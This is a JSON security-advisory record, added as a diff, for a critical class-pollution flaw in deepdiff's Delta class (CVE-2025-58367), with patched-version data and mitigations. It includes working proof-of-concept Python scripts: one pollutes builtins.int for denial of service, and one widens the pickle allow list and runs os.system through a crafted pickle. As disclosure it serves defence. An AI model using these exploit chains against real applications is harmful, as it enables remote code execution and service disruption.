@@ -1,0 +1,65 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2025-09-03T22:25:12Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "deepdiff"
+  },
+  "Advisory": {
+    "DatabaseId": 309814,
+    "Id": "GSA_kwCzR0hTQS1tdzI2LTVnMnYtaHF3M84ABLo2",
+    "GhsaId": "GHSA-mw26-5g2v-hqw3",
+    "References": [
+      {
+        "Url": "https://github.com/seperman/deepdiff/security/advisories/GHSA-mw26-5g2v-hqw3"
+      },
+      {
+        "Url": "https://github.com/dgilland/pydash/issues/180"
+      },
+      {
+        "Url": "https://github.com/dgilland/pydash/commit/2015f0a4bcdbc3a5b27652e38fe97b3ee13ac15f"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58367"
+      },
+      {
+        "Url": "https://github.com/seperman/deepdiff/commit/c69c06c13f75e849c770ade3f556cd16209fd183"
+      },
+      {
+        "Url": "https://github.com/seperman/deepdiff/releases/tag/8.6.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-mw26-5g2v-hqw3"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-mw26-5g2v-hqw3"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-58367"
+      }
+    ],
+    "Description": "### Summary\n[Python class pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/) is a novel vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The `Delta` class is vulnerable to class pollution via its constructor, and when combined with a gadget available in DeltaDiff itself, it can lead to Denial of Service and Remote Code Execution (via insecure [Pickle](https://docs.python.org/3/library/pickle.html) deserialization).\n\nThe gadget available in DeepDiff allows `deepdiff.serialization.SAFE_TO_IMPORT` to be modified to allow dangerous classes such as `posix.system`, and then perform insecure Pickle deserialization via the Delta class. This potentially allows any Python code to be executed, given that the input to `Delta` is user-controlled.\n\nDepending on the application where DeepDiff is used, this can also lead to other vulnerabilities. For example, in a web application, it might be possible to bypass authentication via class pollution.\n\n### Details\n\nThe `Delta` class can take different object types as a parameter in its constructor, such as a `DeltaDiff` object, a dictionary, or even just bytes (that are deserialized via Pickle).\n\nWhen it takes a dictionary, it is usually in the following format:\n```py\nDelta({\"dictionary_item_added\": {\"root.myattr['foo']\": \"bar\"}})\n```\n\nTrying to apply class pollution here does not work, because there is already a filter in place: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23\n\nHowever, this code only runs when parsing the path from a string.\nThe `_path_to_elements` function helpfully returns the given input if it is already a list/tuple:\nhttps://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53\n\nThis means that it is possible to pass the path as the internal representation used by Delta, bypassing the filter:\n\n```py\nDelta(\n    {\n        \"dictionary_item_added\": {\n            (\n                (\"root\", \"GETATTR\"),\n                (\"__init__\", \"GETATTR\"),\n                (\"__globals__\", \"GETATTR\"),\n                (\"PWNED\", \"GET\"),\n            ): 1337\n        }\n    },\n)\n```\n\nGoing back to the possible inputs of `Delta`, when it takes a `bytes` as input, it uses pickle to deserialize them.\nCare was taken by DeepDiff to prevent arbitrary code execution via the `SAFE_TO_IMPORT` allow list.\nhttps://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98\nHowever, using the class pollution in the `Delta`, an attacker can add new entries to this `set`.\n\nThis then allows a second call to `Delta` to [unpickle an insecure class](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) that runs `os.system`, for example.\n\n#### Using dict\n\nUsually, class pollution [does not work](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca#technical-details) when traversal starts at a `dict`/`list`/`tuple`, because it is not possible to reach `__globals__` from there.\nHowever, using two calls to `Delta` (or just one call if the target dictionary that already contains at least one entry) it is possible to first change one entry of the dictionary to be of type `deepdiff.helper.Opcode`, which then allows traversal to `__globals__`, and notably `sys.modules`, which in turn allows traversal to any module already loaded by Python.\nPassing `Opcode` around can be done via pickle, which `Delta` will happily accept given it is in the default allow list.\n\n### Proof of Concept\n\nWith deepdiff 8.6.0 installed, run the following scripts for each proof of concept.\nAll input to `Delta` is assumed to be user-controlled.\n\n#### Denial of Service\n\nThis script will pollute the value of `builtins.int`, preventing the class from being used and making code crash whenever invoked.\n\n```py\n# ------------[ Setup ]------------\nimport pickle\n\nfrom deepdiff.helper import Opcode\n\npollute_int = pickle.dumps(\n    {\n        \"values_changed\": {\"root['tmp']\": {\"new_value\": Opcode(\"\", 0, 0, 0, 0)}},\n        \"dictionary_item_added\": {\n            (\n                (\"root\", \"GETATTR\"),\n                (\"tmp\", \"GET\"),\n                (\"__repr__\", \"GETATTR\"),\n                (\"__globals__\", \"GETATTR\"),\n                (\"__builtins__\", \"GET\"),\n                (\"int\", \"GET\"),\n            ): \"no longer a class\"\n        },\n    }\n)\n\n\nassert isinstance(pollute_int, bytes)\n\n# ------------[ Exploit ]------------\n# This could be some example, vulnerable, application.\n# The inputs above could be sent via HTTP, for example.\n\nfrom deepdiff import Delta\n\n# Existing dictionary; it is assumed that it contains\n# at least one entry, otherwise a different Delta needs to be\n# applied first, adding an entry to the dictionary.\nmydict = {\"tmp\": \"foobar\"}\n\n# Before pollution\nprint(int(\"41\") + 1)\n\n# Apply Delta to mydict\nresult = mydict + Delta(pollute_int)\n\nprint(int(\"1337\"))\n```\n\n```shell\n$ python poc_dos.py\n42\nTraceback (most recent call last):\n  File \"/tmp/poc_dos.py\", line 43, in \u003cmodule\u003e\n    print(int(\"1337\"))\nTypeError: 'str' object is not callable\n```\n\n#### Remote Code Execution\n\nThis script will create a file at `/tmp/pwned` with the output of `id`.\n\n```py\n# ------------[ Setup ]------------\nimport os\nimport pickle\n\nfrom deepdiff.helper import Opcode\n\npollute_safe_to_import = pickle.dumps(\n    {\n        \"values_changed\": {\"root['tmp']\": {\"new_value\": Opcode(\"\", 0, 0, 0, 0)}},\n        \"set_item_added\": {\n            (\n                (\"root\", \"GETATTR\"),\n                (\"tmp\", \"GET\"),\n                (\"__repr__\", \"GETATTR\"),\n                (\"__globals__\", \"GETATTR\"),\n                (\"sys\", \"GET\"),\n                (\"modules\", \"GETATTR\"),\n                (\"deepdiff.serialization\", \"GET\"),\n                (\"SAFE_TO_IMPORT\", \"GETATTR\"),\n            ): set([\"posix.system\"])\n        },\n    }\n)\n\n\n# From https://davidhamann.de/2020/04/05/exploiting-python-pickle/\nclass RCE:\n    def __reduce__(self):\n        cmd = \"id \u003e /tmp/pwned\"\n        return os.system, (cmd,)\n\n\n# Wrap object with dictionary so that Delta does not crash\nrce_pickle = pickle.dumps({\"_\": RCE()})\n\nassert isinstance(pollute_safe_to_import, bytes)\nassert isinstance(rce_pickle, bytes)\n\n# ------------[ Exploit ]------------\n# This could be some example, vulnerable, application.\n# The inputs above could be sent via HTTP, for example.\n\nfrom deepdiff import Delta\n\n# Existing dictionary; it is assumed that it contains\n# at least one entry, otherwise a different Delta needs to be\n# applied first, adding an entry to the dictionary.\nmydict = {\"tmp\": \"foobar\"}\n\n# Apply Delta to mydict\nresult = mydict + Delta(pollute_safe_to_import)\n\nDelta(rce_pickle)  # no need to apply this Delta\n```\n\n```shell\n$ python poc_rce.py\n$ cat /tmp/pwned\nuid=1000(dtc) gid=100(users) groups=100(users),1(wheel)\n```\n\n### Who is affected?\n\nOnly applications that pass (untrusted) user input directly into `Delta` are affected.\n\nWhile input in the form of `bytes` is the most flexible, there are certainly other gadgets, depending on the application, that can be used via just a dictionary. This dictionary could easily be parsed, for example, from JSON. One simple example would be overriding `app.secret_key` of a Flask application, which would allow an attacker to sign arbitrary cookies, leading to an authentication bypass.\n\n### Mitigations\n\nA straightforward mitigation is preventing traversal through private keys, like it is already done in the path parser.\nThis would have to be implemented in both `deepdiff.path._get_nested_obj` and `deepdiff.path._get_nested_obj_and_force`,\nand possibly in `deepdiff.delta.Delta._get_elements_and_details`.\nExample code that raises an error when traversing these properties:\n```py\nif elem.startswith(\"__\") and elem.endswith(\"__\"):\n  raise ValueError(\"traversing dunder attributes is not allowed\")\n```\n\nHowever, if it is desirable to still support attributes starting and ending with `__`, but still protect against this vulnerability, it is possible to only forbid `__globals__` and `__builtins__`, which stops the most serious cases of class pollution (but not all).\nThis was the solution adopted by pydash: https://github.com/dgilland/pydash/issues/180",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-09-03T22:25:09Z",
+    "Severity": "CRITICAL",
+    "Summary": "DeepDiff Class Pollution in Delta class leading to DoS, Remote Code Execution, and more",
+    "UpdatedAt": "2025-09-10T20:49:39Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.6.1"
+      },
+      "VulnerableVersionRange": "\u003e= 5.0.0, \u003c= 8.6.0"
+    }
+  ]
+}
